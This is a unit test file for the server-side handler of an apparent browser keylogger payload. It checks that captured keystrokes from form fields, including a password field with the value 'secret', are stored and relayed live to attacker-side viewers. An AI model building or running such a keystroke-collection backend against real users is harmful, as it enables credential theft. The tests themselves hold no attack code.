import { describe, it, expect, vi } from "vitest";
import * as handler from "../../server/payloads/keylogger.js";

/** Minimal in-memory mock of the DB layer for keylogger handler unit tests. */
function makeMockDb() {
  const entryStore = [];
  return {
    insertKeyloggerEntry(clientId, elementDescriptor, elementType, eventType, data, value, timestamp) {
      entryStore.push({ clientId, elementDescriptor, elementType, eventType, data, value, timestamp });
    },
    getKeyloggerEntries(_clientId) {
      return entryStore.slice();
    },
    clearKeyloggerEntries(_clientId) {
      entryStore.splice(0);
    },
    _entryStore: entryStore,
  };
}

describe("keylogger handler", () => {
  it("initState returns entries getter and viewers set", () => {
    const db = makeMockDb();
    const state = handler.initState(db, "client-1");
    expect(state.entries).toEqual([]);
    expect(state.viewers).toBeInstanceOf(Set);
  });

  it("entries getter is DB-backed and reflects insertions", () => {
    const db = makeMockDb();
    const state = handler.initState(db, "client-1");
    expect(state.entries.length).toBe(0);
    db.insertKeyloggerEntry("client-1", "input#q", "text", "input", "a", "a", Date.now());
    expect(state.entries.length).toBe(1);
    expect(state.entries[0].elementDescriptor).toBe("input#q");
  });

  it("onMessage with entries type stores entries and broadcasts to viewers", () => {
    const db = makeMockDb();
    const state = handler.initState(db, "client-1");
    const ws = { readyState: 1, send: vi.fn() };
    state.viewers.add(ws);
    const pushToViewers = vi.fn();

    handler.onMessage(state, {
      type: "entries",
      entries: [
        { elementDescriptor: "input#user", elementType: "text", eventType: "input", data: "a", value: "a", timestamp: 1000 },
        { elementDescriptor: "input#user", elementType: "text", eventType: "input", data: "d", value: "ad", timestamp: 1001 },
      ],
    }, pushToViewers);

    expect(db._entryStore).toHaveLength(2);
    expect(db._entryStore[0].elementDescriptor).toBe("input#user");

    expect(ws.send).toHaveBeenCalledOnce();
    const msg = JSON.parse(ws.send.mock.calls[0][0]);
    expect(msg.type).toBe("entries");
    expect(msg.entries).toHaveLength(2);
  });

  it("onMessage ignores empty entries array", () => {
    const db = makeMockDb();
    const state = handler.initState(db, "client-1");
    const pushToViewers = vi.fn();

    handler.onMessage(state, { type: "entries", entries: [] }, pushToViewers);
    expect(db._entryStore).toHaveLength(0);
    expect(pushToViewers).not.toHaveBeenCalled();
  });

  it("onMessage ignores unknown message types", () => {
    const db = makeMockDb();
    const state = handler.initState(db, "client-1");
    const pushToViewers = vi.fn();

    handler.onMessage(state, { type: "unknown", entries: [] }, pushToViewers);
    expect(db._entryStore).toHaveLength(0);
    expect(pushToViewers).not.toHaveBeenCalled();
  });

  it("onViewerConnect sends init with all current entries", () => {
    const db = makeMockDb();
    db.insertKeyloggerEntry("client-1", "input#pass", "password", "input", "", "secret", Date.now());
    const state = handler.initState(db, "client-1");
    const ws = { readyState: 1, send: vi.fn(), on: vi.fn() };

    handler.onViewerConnect(state, ws);

    const msg = JSON.parse(ws.send.mock.calls[0][0]);
    expect(msg.type).toBe("init");
    expect(msg.entries).toHaveLength(1);
    expect(msg.entries[0].elementDescriptor).toBe("input#pass");
    expect(state.viewers.has(ws)).toBe(true);
  });

  it("onViewerConnect handles clear message from viewer", () => {
    const db = makeMockDb();
    db.insertKeyloggerEntry("client-1", "input#q", "text", "input", "x", "x", Date.now());
    const state = handler.initState(db, "client-1");

    let messageHandler;
    const ws = {
      readyState: 1,
      send: vi.fn(),
      on: vi.fn((event, fn) => {
        if (event === "message") messageHandler = fn;
      }),
    };
    const ws2 = { readyState: 1, send: vi.fn(), on: vi.fn() };

    handler.onViewerConnect(state, ws);
    state.viewers.add(ws2);

    // Simulate viewer sending a clear command
    messageHandler(JSON.stringify({ type: "clear" }));

    expect(db._entryStore).toHaveLength(0);
    // Both viewers should receive "cleared"
    expect(ws.send).toHaveBeenCalledTimes(2); // init + cleared
    const cleared = JSON.parse(ws.send.mock.calls[1][0]);
    expect(cleared.type).toBe("cleared");
  });

  it("onViewerConnect removes ws from viewers on close", () => {
    const db = makeMockDb();
    const state = handler.initState(db, "client-1");
    const handlers = {};
    const ws = {
      readyState: 1,
      send: vi.fn(),
      on: vi.fn((event, fn) => { handlers[event] = fn; }),
    };

    handler.onViewerConnect(state, ws);
    expect(state.viewers.has(ws)).toBe(true);

    handlers.close();
    expect(state.viewers.has(ws)).toBe(false);
  });

  it("pushToAllViewers broadcasts all entries", () => {
    const db = makeMockDb();
    db.insertKeyloggerEntry("client-1", "input#q", "text", "input", "x", "x", Date.now());
    const state = handler.initState(db, "client-1");
    const ws = { readyState: 1, send: vi.fn() };
    state.viewers.add(ws);

    handler.pushToAllViewers(state);

    const msg = JSON.parse(ws.send.mock.calls[0][0]);
    expect(msg.type).toBe("entries");
    expect(msg.entries).toHaveLength(1);
  });

  it("pushToAllViewers is no-op when no viewers", () => {
    const db = makeMockDb();
    const state = handler.initState(db, "client-1");
    // Should not throw
    expect(() => handler.pushToAllViewers(state)).not.toThrow();
  });

  it("onDisconnect notifies viewers", () => {
    const db = makeMockDb();
    const state = handler.initState(db, "client-1");
    const ws = { readyState: 1, send: vi.fn() };
    state.viewers.add(ws);

    handler.onDisconnect(state);

    const msg = JSON.parse(ws.send.mock.calls[0][0]);
    expect(msg.type).toBe("disconnected");
  });

  it("onDisconnect is no-op when no viewers", () => {
    const db = makeMockDb();
    const state = handler.initState(db, "client-1");
    expect(() => handler.onDisconnect(state)).not.toThrow();
  });
});
